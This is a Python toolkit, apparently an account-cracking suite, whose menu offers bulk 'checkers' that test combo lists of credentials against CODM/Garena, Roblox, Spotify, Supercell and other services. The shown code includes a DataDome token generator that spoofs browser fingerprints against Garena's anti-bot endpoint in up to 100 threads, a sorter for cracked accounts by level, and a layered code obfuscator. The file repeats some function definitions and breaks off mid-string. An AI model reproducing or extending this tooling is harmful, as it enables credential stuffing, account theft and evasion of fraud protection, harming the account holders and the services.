def find_nearest_account_file():
    # Keywords to search for in filenames
    keywords = ["garena", "account", "codm"]
    
    # Walk through the current directory and subdirectories
    for root, _, files in os.walk(os.getcwd()):
        for file in files:
            if file.endswith(".txt") and any(keyword in file.lower() for keyword in keywords):
                return os.path.join(root, file)
    
    # If no matching file is found, use a default name in the current directory
    return os.path.join(os.getcwd(), "accounts.txt")


def main():
 #   clear_screen()
    display_banner()
    
    # Prompt for file path in a synchronous context
    file_path = input(f"{Fore.YELLOW}Name ng file mo : ").strip()
    if not file_path:
        file_path = find_nearest_account_file()  # Find the nearest matching .txt file if no input is provided
    
    # Check if the provided path is a .txt file and exists
    if not file_path.endswith('.txt') or not os.path.isfile(file_path):
        print("Invalid file path. Please provide a valid .txt file.")
        return
    
    # Wait for user to press Enter to start the bulk check
    input(f"{Fore.GREEN}Press Enter ...")

    # Call your bulk check function with the file path
    bulk_check(file_path)

# Example placeholder for the bulk check function
def get_device_id():
    # Directory and file path for storing device ID
    dir_path = os.path.expanduser("~/.dont_delete_me")
    file_path = os.path.join(dir_path, "here.txt")  
    # Check if the file already exists
    if os.path.exists(file_path):
        # Read the existing device ID from the file
        with open(file_path, 'r') as file:
            device_id = file.read().strip()  # Strip any extra whitespace/newlines
    else:
        # Create the directory if it doesn't exist
        os.makedirs(dir_path, exist_ok=True)  # Ensure the directory is created
        
        # Prompt for user name
        user_name = input("Enter your name: ").strip()  # Get and strip user input

        # Collect various system details for generating a unique ID
        system_info = (
            platform.system(),         # OS type (e.g., Windows, Linux)
            platform.release(),        # OS version
            platform.version(),        # OS build version
            platform.machine(),        # Hardware type (e.g., x86_64)
            platform.processor(),      # Processor information
        )

        # Generate a consistent UUID from hardware properties
        hardware_id = "-".join(system_info)  # Combine system info into a single string
        unique_id = uuid.uuid5(uuid.NAMESPACE_DNS, hardware_id)  # Generate UUID based on system info

        # Hash the unique ID for consistency and uniqueness
        device_hash = hashlib.sha256(unique_id.bytes).hexdigest()  # Create a SHA-256 hash

        # Combine user input with a portion of the hash to form the device ID
        device_id = f"{user_name}_{device_hash[:8]}"  # User name + first 8 characters of hash for uniqueness

        # Write the generated device ID to the file
        with open(file_path, 'w') as file:
            file.write(device_id)  # Save the device ID
    
    return device_id  # Return the device ID
# Run the main functio
def clear_screen():
    # Windows
    
    if os.name == 'nt':
        os.system('cls')
    # Mac and Linux
    else:
        os.system('clear')
        

#BANNER HERE LOGO OR IMAGE 
def slow_print(text, delay=0.01):
    for line in text.splitlines():
        print(line)
        time.sleep(delay)

def display_banner():
    os.system("cls" if os.name == "nt" else "clear")
    
    
#Banner Image
    banner = Fore.RED + r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⢔⣦⣶⣿⣿⣿⣿⡷⠖⠒⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠉⠁⠂⠀⠀⢀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠶⣦⡤⣄⠀⠀⠀⠀⠀⠀⣠⠖⢩⣶⣿⣿⣿⣿⣿⠟⢉⣠⠔⠊⠁⠀⠀⠀⣀⣄⠀⠀⠉⠑⢦⣠⣤⣤⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣌⡧⡾⠀⠀⠀⠀⡠⠊⢁⣴⣿⣿⣿⣿⣿⢟⣠⡾⠟⠁⠀⣀⣤⣶⠞⣫⠟⠁⠀⢀⠄⠀⢀⠙⢿⣿⣿⣷⣄
⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⣠⣾⣶⣶⣿⣿⣿⣿⣿⣿⣷⡿⠋⣀⣤⣶⣿⣿⣋⣴⡞⠁⠀⠀⣠⠊⠀⠀⢸⡄⢨⣿⣿⣿⣿
⠀⠀⠀⠀⠀⢃⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠿⠿⢻⣿⣿⣿⣿⣿⣿⠿⠛⢉⣴⣿⢿⣿⠏⠀⠀⠀⡴⠃⣰⢀⠀⢸⣿⣤⣏⢻⣿⣿
⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⢀⣾⡿⣿⡿⠁⠀⢀⣾⣿⣿⣿⡿⠋⠁⠀⣠⣿⠟⢡⣿⡟⠀⢀⣤⣾⠁⣼⣿⢸⡇⢸⣿⣿⣿⡈⣿⣿
⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⢀⣾⠋⣼⣿⠁⢀⠀⣼⣿⣿⠟⠁⠀⠀⠀⣰⡿⠋⢠⣿⡿⠁⢠⣾⣿⡏⢀⣿⣿⣾⣿⢸⣿⣿⣿⡇⢹⣿
⠀⠀⠀⢰⡶⣤⣤⣄⠀⠀⠀⡼⠁⣼⣿⣿⣾⣿⣰⣿⠟⠁⠀⠀⠀⠀⢠⡿⠁⠀⣾⣿⠃⢠⣿⢿⡿⠁⠸⢿⣿⣿⣿⣿⣿⣿⣿⣿⠸⣿
⠀⠀⠀⠘⣧⣈⣷⡟⠀⠀⣰⠁⡼⢻⣿⣿⣿⣿⡿⠋⠀⠀⠂⠒⠒⠒⣾⠋⠀⢠⣿⡏⢠⣿⢃⡿⠁⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿
⠀⠀⠀⠀⠈⠉⠁⠀⠀⢠⠇⣰⠁⠸⣹⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠐⡇⠀⠀⢸⣿⢃⣿⠋⣿⡀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⠀⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣰⠃⡀⢀⣿⣿⡏⢘⣶⣶⣶⣷⣒⣄⠀⠀⠀⠀⠀⠸⣿⣾⠃⠰⠁⠙⢦⡀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⢠⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⠞⢁⣾⣿⣿⣷⠟⠁⣠⣾⣿⣿⣧⠀⠀⠀⠀⠀⠀⣿⡏⠀⠀⠀⠀⠀⠙⢦⡀⠀⢿⣿⣿⣿⣿⣿⣿⣸⠃
⠀⠀⠀⠀⠀⠀⠀⣠⣾⡖⠁⣠⣾⣿⣿⣿⡏⠀⢰⠿⢿⣿⣯⣼⠁⠀⠀⠀⠀⠀⠹⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⢬⣿⣿⡘⣿⣿⣏⣿⠀
⠀⠀⠀⠀⠀⣠⣾⢟⠋⣠⣾⣿⡿⠋⢿⣿⠀⠀⢼⠀⠀⢀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣷⣴⣆⡀⠀⠀⠈⢿⣧⠸⣿⣿⣿⣿
⠀⠀⢀⡤⠞⢋⣴⣯⣾⡿⠟⠋⠀⠀⢸⣿⡆⠀⠸⡀⠉⢉⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣶⣆⠀⠈⢿⣧⠹⣿⣿⣿
⠀⠀⠀⣸⣶⣿⣿⠟⠋⠀⠀⠀⠀⣴⡎⠈⠻⡀⠈⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠛⠛⠻⣿⣬⡏⠻⣷⡀⠈⢻⣿⣿⣿⣿
⢂⣠⣴⣿⡿⢋⣼⣿⣿⣿⣿⣿⠋⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⡄⠀⠀⢀⡾⣿⠁⠀⢹⡇⠀⢠⣿⣿⣿⣿
⣿⣿⣽⣯⣴⣿⣿⠿⡿⠟⠛⢻⡤⠚⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⠈⠉⢉⡴⠃⠀⠀⢸⠇⢠⣿⣿⣿⣿⣿
⣿⡇⣿⠿⣯⡀⠀⠀⠈⣦⡴⠋⠀⠀⢀⠨⠓⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠷⠒⠋⠀⠀⠀⠀⠃⣴⣿⠿⣡⣿⠏⠀
⠁⠀⠃⠀⠈⠳⣤⠴⡻⠋⠀⢀⡠⠊⠁⠀⠀⢀⡽⢄⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⠏⣺⠟⠁⠀⠀
⠀⠀⠀⠀⠀⡰⠋⢰⠁⠀⠀⠀⠀⠀⣀⠤⠊⠁⠀⠀⢱⡀⠘⢆⡀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠖⠛⠛⢉⣤⠞⠁⠀⠀⠀⠀
⠀⠀⠀⠀⡜⠁⠀⠈⢢⡀⠀⠀⠀⠀⠁⠀⠀⠀⣀⠔⠋⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡞⠉⠀⠀⠀⣀⠀⠀⠈
⠀⠀⠀⡜⠀⠀⠀⠀⢰⠑⢄⠀⠀⠀⠀⠀⠀⠊⠀⢀⣀⢀⠇⠀⡠⠒⠒⢶⠈⠉⠑⡖⠈⠓⢢⠤⢄⣀⣴⣾⣏⠉⠛⠋⠉⠉⠀⠀⠀⢠
⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠑⣄⡀⠀⠀⠀⠀⠀⠀⣹⡿⢤⣼⠃⠀⠀⢸⠀⠀⠀⡇⠀⠀⢸⠀⠀⠈⣿⣿⣿⣦⣀⣀⣀⣀⣀⣶⢶⣿
⠀⠀⠀⠀⠀⣠⠔⠒⢻⠀⠀⠀⠃⠉⠒⠤⣀⡀⠤⠚⠁⣇⡰⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⠀⠀⣰⠟⠋⠁⠀⠀⠀⠀⠈⠉⠛⠦⡻
⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠃⠹⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠀⠀⠈⠓⠤⣀⡀⠀⠀⠀⠀⠀⢀⣠⠔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠈⠉⠉⠉⠉⠉⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + Style.RESET_ALL

    box = Fore.MAGENTA + Style.BRIGHT + """
╔═════════════════════════════════════════════════╗
║         ✨ VIP CALL OF DUTY CHECKER ✨          ║
║               🪩   BY: Trish   🪩                 ║
╚═════════════════════════════════════════════════╝
""" + Style.RESET_ALL

    slow_print(banner, delay=0.05)
    print(box)

def find_nearest_account_file():
    keywords = ["garena", "account", "codm"]
    for root, _, files in os.walk(os.getcwd()):
        for file in files:
            if file.endswith(".txt") and any(keyword in file.lower() for keyword in keywords):
                return os.path.join(root, file)
    return os.path.join(os.getcwd(), "accounts.txt")

def main():
    try:
        display_banner()
        file_path = input(f"{Fore.YELLOW} enter your file name: {Style.RESET_ALL}").strip()

        if not file_path:
            file_path = find_nearest_account_file()

        if not file_path.endswith('.txt') or not os.path.isfile(file_path):
            print(f"{Fore.RED}Invalid file path. Please provide a valid .txt file.{Style.RESET_ALL}")
            return

        input(f"{Fore.CYAN}Press Enter to start the bulk check...{Style.RESET_ALL}")
        bulk_check(file_path)

    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Exiting program...{Style.RESET_ALL}")
        sys.exit(0)


def codm_checker_flow():
    try:
        display_banner()
        file_path = input(f"{Fore.YELLOW}Enter your file name (example: 2.txt): {Style.RESET_ALL}").strip()
        if not file_path:
            file_path = find_nearest_account_file()

        if not file_path.endswith('.txt') or not os.path.isfile(file_path):
            print(f"{Fore.RED}Invalid file path. Please provide a valid .txt file.{Style.RESET_ALL}")
            return

        input(f"{Fore.CYAN}Press Enter to start the bulk check...{Style.RESET_ALL}")
        bulk_check(file_path)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Exiting program...{Style.RESET_ALL}")
        sys.exit(0)

def run_ml_separator():
    EXPIRATION_DATETIME = "2027-02-23 11:05:00 PM"

    def check_expiration():
        current_datetime = datetime.now()
        expiration_datetime = datetime.strptime(EXPIRATION_DATETIME, "%Y-%m-%d %I:%M:%S %p")
        if current_datetime > expiration_datetime:
            print(Fore.RED + f"The script has expired as of {EXPIRATION_DATETIME}.")
            exit()

    def display_logo():
        logo = """
+-------------------------------------------------+
|                LEVEL SEPERATOR                  |
+-------------------------------------------------+
"""
        small_text = """
Made by: TRISH
TG: https://t.me/dropandplayy
        """
        print(Fore.CYAN + Style.BRIGHT + logo)
        print(Fore.GREEN + Style.BRIGHT + small_text)
        print(Style.RESET_ALL)

    def process_accounts(input_file):
        level_bins = {
            "100+": [], "90": [], "80": [], "70": [], "60": [], "50": [],
            "40": [], "30": [], "20": [], "10": []
        }
        success, failed = 0, 0
        output_file = os.path.join(os.path.dirname(input_file), "separate_result.txt")

        try:
            with open(input_file, 'r') as infile:
                accounts = infile.readlines()

            with open(output_file, 'w') as outfile:
                print(Fore.CYAN + Style.BRIGHT + "\nProcessing Accounts...\n")

                for acc in accounts:
                    acc = acc.strip()
                    parts = acc.split(" | ")
                    if len(parts) >= 2:
                        match = re.search(r"Level: (\d+)", acc)
                        if match:
                            level = int(match.group(1))
                            if level >= 100:
                                level_bins["100+"].append(acc)
                            elif level >= 90:
                                level_bins["90"].append(acc)
                            elif level >= 80:
                                level_bins["80"].append(acc)
                            elif level >= 70:
                                level_bins["70"].append(acc)
                            elif level >= 60:
                                level_bins["60"].append(acc)
                            elif level >= 50:
                                level_bins["50"].append(acc)
                            elif level >= 40:
                                level_bins["40"].append(acc)
                            elif level >= 30:
                                level_bins["30"].append(acc)
                            elif level >= 20:
                                level_bins["20"].append(acc)
                            elif level >= 10:
                                level_bins["10"].append(acc)
                            else:
                                failed += 1
                                continue
                            success += 1
                        else:
                            failed += 1
                    else:
                        failed += 1

                for label, lines in level_bins.items():
                    outfile.write(f"Level {label} Accounts:\n")
                    outfile.writelines(f"{line}\n" for line in lines)
                    outfile.write("\n" * 10)

            print(Fore.MAGENTA + Style.BRIGHT + "\nProcessing Complete!" + Style.RESET_ALL)
            print(Fore.GREEN + f"Total Success: {success}")
            print(Fore.RED + f"Total Failed: {failed}")
            print(Fore.CYAN + f"Organized accounts saved to: {output_file}")
        except FileNotFoundError:
            print(Fore.RED + f"The file {input_file} was not found.")
        except Exception as e:
            print(Fore.RED + f"An error occurred: {e}")

    check_expiration()
    display_logo()
    filename = input(Fore.YELLOW + "Enter File Name: ")
    process_accounts(filename)

def main_menu():
    clear_screen()
    print(Fore.RED + """
╔════════════════════════════════════════════════════════════════════╗
║                🔥  SELECT YOUR VIP TOOL  🔥                        ║
╠════════════════════════════════════════════════════════════════════╣
║  1.  📢 CODM Checker                                               ║
║  2.  📢 ML Separator Level                                         ║
║  3.  📢 Datadome Generator                                         ║
║  4.  📢 Enc Tool V1                                                ║
║  5.  📢 Roblox Checker                                             ║
║  6.  📢 ASCII Banner Generator                                     ║
║  7.  📢 Proxy Gen. with Proxy checker                              ║
║  8.  📢 File/txt Duplicate Remover                                 ║
║  9.  📢 Codm Level Separator                                       ║
║ 10.  📢 Enc Tool V2                                                ║
║ 11.  📢 VivaMax Checker                                            ║
║ 12.  📢 CodaShop Checker                                           ║
║ 13.  📢 ML SeparatorV2                                             ║
║ 14.  📢 Codm Separator                                             ║
║ 15.  📢 Termux Design Fonts && Theme                               ║
║ 16.  📢 Termux Design Make own Banner                              ║
║ 17.  📢 Termux Design Arrow Prompt                                 ║
║ 18.  📢 Url Remover                                                ║
║ 19.  📢 Netease Checker                                            ║
║ 20.  📢 PointBlank Checker                                         ║
║ 21.  📢 Spotify Checker                                            ║
║ 22.  📢 SuperCell Checker                     
║ 23.  📢 Roblox Checker  
║ 24.  📢 Proxy scrapper       ║
╚════════════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)

    active_users = random.randint(1, 10)
    percentage = int((active_users / 50) * 100)
    bar = '█' * active_users
    color = Fore.GREEN if active_users >= 10 else Fore.YELLOW if active_users >= 5 else Fore.RED
    print(f"{Fore.CYAN}Active users now: {color}{active_users}")
    print(f"{color}{bar} {percentage}%{Style.RESET_ALL}\n")

    choice = input(Fore.YELLOW + "Enter choice [1–24]: " + Style.RESET_ALL).strip()

    if choice == "1":
        codm_checker_flow()
    elif choice == "2":
        run_ml_separator()
    elif choice == "3":
        run_datadome_generator()
    elif choice == "4":
        run_encryption_tool()
    elif choice == "5":
        run_roblox_checker()
    elif choice == "6":
        run_ascii_generator()
    elif choice == "7":
        run_proxy_checker()
    elif choice == "8":
        run_duplicate_remover()
    elif choice == "9":
        run_codm_separator()
    elif choice == "10":
        run_anti_reverse_encoder()
    elif choice == "11":
        filename = input(Fore.CYAN + "[📂] Enter VivaMax combo filename: " + Style.RESET_ALL)
        print(Fore.MAGENTA + "\n🔍 Starting VivaMax Checker..." + Style.RESET_ALL)
        start = time.time()
        vivacheck(filename)
        print(Fore.GREEN + f"\n✅ Completed in {time.time() - start:.2f}s" + Style.RESET_ALL)
    elif choice == "12":
        print(Fore.MAGENTA + "\n🔍 Starting Codashop Checker..." + Style.RESET_ALL)
        start = time.time()
        main_coda_checker()
        print(Fore.GREEN + f"\n✅ Completed in {time.time() - start:.2f}s" + Style.RESET_ALL)
    elif choice == "13":
        print(Fore.MAGENTA + "\n📊 Starting ML SeparatorV2 (with graph)..." + Style.RESET_ALL)
        run_ml_separator()
    elif choice == "14":
        print(Fore.MAGENTA + "\n📊 Starting Codm Separator" + Style.RESET_ALL)
        run_codm_separator()
    elif choice == "15":
        run_termux_theme()
    elif choice == "16":
        run_custom_ascii_banner()
    elif choice == "17":
        run_termux_arrow_prompt()
    elif choice == "18":
        run_url_remover()
    elif choice == "19":
        run_netease_checker()
    elif choice == "20":
        run_pointblank_checker()
    elif choice == "21":
        run_spotify_checker()
    elif choice == "22":
        run_supercell_checker()
    elif choice == "23":
         run_roblox_checker()
    elif choice == "24":
        run_proxy_checker
    else:
        print(Fore.RED + "❌ Invalid option. Please enter a number from 1 to 24." + Style.RESET_ALL)
        
def run_datadome_generator():
    import json
    import urllib.parse
    import requests
    import threading
    from queue import Queue

    def get_new_datadome():
        url = 'https://dd.garena.com/js/'
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://account.garena.com',
            'pragma': 'no-cache',
            'referer': 'https://account.garena.com/',
            'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
        }

        payload = {
            'jsData': json.dumps({
                "ttst": 76.7, "ua": headers['user-agent'],
                "br_oh": 824, "br_ow": 1536, "br_h": 738, "br_w": 260,
                "rs_h": 864, "rs_w": 1536, "rs_cd": 24,
                "lg": "en-US", "pr": 1.25, "tz": -480
            }),
            'eventCounters': '[]',
            'jsType': 'ch',
            'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
            'ddk': 'AE3F04AD3F0D3A462481A337485081',
            'Referer': 'https://account.garena.com/',
            'request': '/',
            'responsePage': 'origin',
            'ddv': '4.35.4'
        }

        data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

        try:
            response = requests.post(url, headers=headers, data=data, timeout=10)
            response.raise_for_status()
            response_json = response.json()
            if response_json.get('status') == 200 and 'cookie' in response_json:
                cookie_string = response_json['cookie']
                datadome = cookie_string.split(';')[0].split('=')[1]
                return datadome
            else:
                print("[-] No token found or bad response.")
                return None
        except Exception as e:
            print(f"[!] Error: {e}")
            return None

    def worker(queue, results, lock):
        while not queue.empty():
            try:
                queue.get_nowait()
            except:
                return
            token = get_new_datadome()
            if token:
                with lock:
                    results.append({"datadome": token})
            queue.task_done()

    try:
        count = int(input("How many DataDome tokens do you want to get? (1-10000): "))
        if not 1 <= count <= 10000:
            raise ValueError("Number must be between 1 and 1000.")
    except ValueError as ve:
        print(f"Invalid input: {ve}")
        return

    queue = Queue()
    results = []
    lock = threading.Lock()

    for _ in range(count):
        queue.put(1)

    threads = []
    for _ in range(min(100, count)):  # Max 100 threads
        t = threading.Thread(target=worker, args=(queue, results, lock))
        t.daemon = True
        t.start()
        threads.append(t)

    queue.join()

    with open("datadome.txt", "w") as f:
        json.dump(results, f, indent=2)

    print(f"\nSaved {len(results)} DataDome token(s) to datadome.txt")

# -*- coding:utf8 -*-
# Best Encrypter PYTHON

# Imports (put at the top, no need for try/except here)
import os
import sys
import zlib
import gzip
import lzma
import time
import base64
import marshal
import py_compile
from colorama import Fore, Style

# Color definitions
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[94m', '\033[01;35m'
cn, k, g = '\033[00;36m', '\033[90m','\033[38;5;130m'
tr = f'{rd}[{gn}+{rd}]{gn}'
fls = f'{rd}[{lrd}-{rd}]{lrd}'

# Clear screen
def clear():
    if 'Windows' in __import__("platform").uname():
        os.system("cls")
    else:
        os.system("clear")

# Version check
if sys.version_info[0] == 2:
    _input = "raw_input('%s')"
elif sys.version_info[0] == 3:
    _input = "input('%s')"
else:
    sys.exit(f"\n{fls}Your Python Version is not Supported!")

# Encoding shortcuts
zlb = lambda in_: zlib.compress(in_)
b16 = lambda in_: base64.b16encode(in_)
b32 = lambda in_: base64.b32encode(in_)
b64 = lambda in_: base64.b64encode(in_)
gzi = lambda in_: gzip.compress(in_)
lzm = lambda in_: lzma.compress(in_)
mar = lambda in_: marshal.dumps(compile(in_, '<x>', 'exec'))

# Banner function (renamed to avoid conflict)
def enc_banner():
    clear()
    print(f'''   {k}                                      
         .+#-                                           
         .+@@%-                                         
           .*@@%-   {cn}          ..     {k}                   
             .*@@%- {cn}         .@@# {k}                      
               .*@@%- {cn}       +@@-    {k}                   
               :#@@@@%-{cn}      @@#     -@@=               
             :#@@*.{k}.+@@%-{cn}   =@@:      =@@@=             
           :#@@*. {k}   .+@@#:{cn}  -+         =@@@=           
         :#@@*.   {k}     .+@@%-   {cn}          =@@@=         
        +@@@-     {k}       .#@@#:   {cn}          %@@%.       
         :#@@*.          {k} #@@@@%-        {cn} =@@@=         
        {cn}   -#@@*.        -@@+.{k}*@@#:    {cn} =@@@=           
        {cn}     :#@@#:      %@@  {k} .+@@%- {cn} :#%=             
               :#@*  {cn}   -@@=    {k} .*@@%-                 
                     {cn}   %@%     {k}   .+@@%-               
                     {cn}  -@@-        {k}  .*@@%-             
                         .        {k}     .+@@%-           
                                   {k}      .*@@%-         
                                   {k}        .+*:
    {gn}Python Obfuscate | OWNER TRISH & KHAMBENG                           
                                   ''')

# Menu function (renamed too)
def enc_menu():
    print (f'''{k}
{rd}[{yw}1{rd}] {gn}Encode Marshal
{rd}[{yw}2{rd}] {gn}Encode Zlib
{rd}[{yw}3{rd}] {gn}Encode Base16
{rd}[{yw}4{rd}] {gn}Encode Base32
{rd}[{yw}5{rd}] {gn}Encode Base64
{rd}[{yw}6{rd}] {gn}Encode Lzma
{rd}[{yw}7{rd}] {gn}Encode Gzip
{rd}[{yw}8{rd}] {gn}Encode Zlib,Base16
{rd}[{yw}9{rd}] {gn}Encode Zlib,Base32
{rd}[{yw}10{rd}] {gn}Encode Zlib,Base64
{rd}[{yw}11{rd}] {gn}Encode Gzip,Base16
{rd}[{yw}12{rd}] {gn}Encode Gzip,Base32
{rd}[{yw}13{rd}] {gn}Encode Gzip,Base64
{rd}[{yw}14{rd}] {gn}Encode Lzma,Base16
{rd}[{yw}15{rd}] {gn}Encode Lzma,Base32
{rd}[{yw}16{rd}] {gn}Encode Lzma,Base64
{rd}[{yw}17{rd}] {gn}Encode Marshal,Zlib
{rd}[{yw}18{rd}] {gn}Encode Marshal,Gzip
{rd}[{yw}19{rd}] {gn}Encode Marshal,Lzma
{rd}[{yw}20{rd}] {gn}Encode Marshal,Base16
{rd}[{yw}21{rd}] {gn}Encode Marshal,Base32
{rd}[{yw}22{rd}] {gn}Encode Marshal,Base64
{rd}[{yw}23{rd}] {gn}Encode Marshal,Zlib,B16
{rd}[{yw}24{rd}] {gn}Encode Marshal,Zlib,B32
{rd}[{yw}25{rd}] {gn}Encode Marshal,Zlib,B64
{rd}[{yw}26{rd}] {gn}Encode Marshal,Lzma,B16
{rd}[{yw}27{rd}] {gn}Encode Marshal,Lzma,B32
{rd}[{yw}28{rd}] {gn}Encode Marshal,Lzma,B64
{rd}[{yw}29{rd}] {gn}Encode Marshal,Gzip,B16
{rd}[{yw}30{rd}] {gn}Encode Marshal,Gzip,B32
{rd}[{yw}31{rd}] {gn}Encode Marshal,Gzip,B64
{rd}[{yw}32{rd}] {gn}Encode Marshal,Zlib,Lzma,B16
{rd}[{yw}33{rd}] {gn}Encode Marshal,Zlib,Lzma,B32
{rd}[{yw}34{rd}] {gn}Encode Marshal,Zlib,Lzma,B64
{rd}[{yw}35{rd}] {gn}Encode Marshal,Zlib,Gzip,B16
{rd}[{yw}36{rd}] {gn}Encode Marshal,Zlib,Gzip,B32
{rd}[{yw}37{rd}] {gn}Encode Marshal,Zlib,Gzip,B64
{rd}[{yw}38{rd}] {gn}Encode Marshal,Zlib,Lzma,Gzip,B16
{rd}[{yw}39{rd}] {gn}Encode Marshal,Zlib,Lzma,Gzip,B32
{rd}[{yw}40{rd}] {gn}Encode Marshal,Zlib,Lzma,Gzip,B64
{rd}[{yw}41{rd}] {gn}Simple Encode
{rd}[{yw}42{rd}] {gn}Exit

''')
    print ('')

# FileSize class
class FileSize:
    def datas(self, z):
        for x in ['Byte', 'KB', 'MB', 'GB']:
            if z < 1024.0:
                return "%3.1f %s" % (z, x)
            z /= 1024.0

    def __init__(self, path):
        if os.path.isfile(path):
            dts = os.stat(path).st_size
            print(f"{tr} Encoded File Size : %s\n" % self.datas(dts))

# Tool launcher
def run_encryption_tool():
    enc_banner()
    enc_menu()

    try:
        choice = int(input(Fore.YELLOW + "Enter encoding option (1–42): " + Style.RESET_ALL))
        if choice == 42:
            return main_menu()
        elif 1 <= choice <= 41:
            file_path = input(Fore.CYAN + "Enter Python filename to encode: " + Style.RESET_ALL).strip()
            if not os.path.isfile(file_path):
                print(Fore.RED + "File not found!" + Style.RESET_ALL)
                return
            with open(file_path, 'r') as f:
                data = f.read()
            Encode(choice, data, "encoded_output.py")  # Assuming output filename
            FileSize("encoded_output.py")  # Show encoded file size
        else:
            print(Fore.RED + "Invalid choice!" + Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)

    input(Fore.GREEN + "\nPress Enter to return to main menu..." + Style.RESET_ALL)
    main_menu()

# Encode Menu
def Encode(option,data,output):
    loop = int(eval(_input % f"{tr} Encode Count : "))
    if option == 1:
        xx = "mar(data.encode('utf8'))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # 